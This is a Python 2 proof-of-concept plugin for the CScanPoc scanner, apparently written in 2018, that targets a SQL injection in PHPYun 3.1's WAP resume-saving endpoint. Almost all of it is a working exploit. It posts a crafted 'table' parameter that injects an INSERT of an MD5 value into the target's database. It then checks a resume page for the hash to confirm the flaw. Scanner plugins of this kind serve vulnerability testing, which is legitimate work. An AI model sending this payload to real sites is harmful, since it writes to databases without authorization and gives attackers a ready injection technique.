# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib2

class Vuln(ABVuln):
    vuln_id = 'PHPYun_0001' # 平台漏洞编号，留空
    name = 'PHPYun 3.1 /wap/member/model/index.class.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-08-04'  # 漏洞公布时间
    desc = '''
        /wap/member/model/index.class.php 过滤不严谨。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPYun'  # 漏洞应用名称
    product_version = '3.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '65f27b80-6590-4c99-b07c-3144171c000b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            header = {
                'User-Agent': "iPhone6"
            }
            check_url = '%s/index.php?m=resume&id=999999' % self.target
            verify_url = '%s/wap/member/index.php?m=index&c=saveresume' % self.target
            data = 'table=expect%60%20%28id%2Cuid%2Cname%29%20values%20%28' \
                   '999999%2C1%2C%28md5%280x23333333%29%29%29%23&subm' \
                   'it=111&eid=1'
            req = urllib2.Request(verify_url, data=data, headers=header)
            urllib2.urlopen(req)
            content = urllib2.urlopen(check_url).read()

            if '2eb120797101bb291fd4a6764' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
